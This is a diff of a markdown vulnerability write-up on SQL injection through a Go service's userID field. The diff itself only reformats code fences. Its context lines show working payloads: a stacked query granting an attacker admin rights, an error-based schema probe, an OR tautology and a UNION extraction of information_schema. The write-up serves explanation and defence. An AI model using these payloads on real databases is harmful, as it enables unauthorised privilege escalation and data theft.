@@ -160,14 +160,12 @@ An attacker injects a payload with multiple SQL statements:
 
 ```
 "userID": "1'; UPDATE users SET is_admin = true WHERE username = 'attacker';--"
-
 ```
 
 If the database driver supports multiple statements, this would execute:
 
 ```sql
 SELECT username, email FROM users WHERE id = '1'; UPDATE users SET is_admin = true WHERE username = 'attacker';--'
-
 ```
 
 The attack grants administrative privileges to the attacker's account, enabling further system compromise.
@@ -177,7 +175,6 @@ An attacker uses error-based techniques to map the database:
 
 ```
 "userID": "' AND (SELECT 1 FROM information_schema.tables WHERE table_schema=database() LIMIT 1)='2"
-
 ```
 
 This causes a type conversion error that reveals database information in error messages. By iterating through similar queries, the attacker builds a complete map of the database schema, tables, and columns to plan more targeted attacks.
@@ -234,21 +231,21 @@ The vulnerability allows an attacker to break out of the intended SQL string con
 1. Normal execution with `userID = "123"` produces:
    ```sql
    SELECT username, email FROM users WHERE id = '123'
-   
-```
+
+   ```
 
 2. Malicious input with `userID = "1' OR '1'='1"` produces:
    ```sql
    SELECT username, email FROM users WHERE id = '1' OR '1'='1'
-   
-```
+
+   ```
    This would return all users rather than just the one with id=1.
 
 3. Data extraction with `userID = "1' UNION SELECT table_name, column_name FROM information_schema.columns WHERE table_schema = 'public';--"` produces:
    ```sql
    SELECT username, email FROM users WHERE id = '1' UNION SELECT table_name, column_name FROM information_schema.columns WHERE table_schema = 'public';--'
    
-```
+   ```
    This returns database metadata, revealing the schema structure.
 
 The Go runtime environment exacerbates this vulnerability because:
